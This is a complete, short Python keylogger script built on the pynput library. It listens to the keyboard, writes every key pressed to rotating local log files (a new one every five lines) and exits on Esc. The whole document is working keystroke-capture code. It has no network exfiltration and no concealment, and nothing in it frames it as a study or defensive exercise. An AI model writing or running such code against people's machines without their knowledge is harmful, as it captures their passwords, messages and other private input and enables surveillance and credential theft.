from pynput.keyboard import Key,Listener

class Keylogger:
    def __init__(self) -> None:
        self.n = 0
        with Listener(self.onPress,self.onRelease) as listener :
            listener.join()


    def appendFile(self,key): 
        with open(f"log{self.n}.txt", "a+", encoding="UTF-8") as file :
            file.write(key)


    def onPress(self,key):
        if key == Key.enter:
            self.appendFile("\n")
        elif key == Key.space:
            self.appendFile(" ")
        else:
            if str(key).find("key") != 0:
                self.appendFile(str(key).replace("'", ""))

        if open(f"log{self.n}.txt", "r+").read().count("\n") == 5 :
            self.n+=1


    def onRelease(self,key):
        if key == Key.esc:
            print("Exit")
            return False

Keylogger()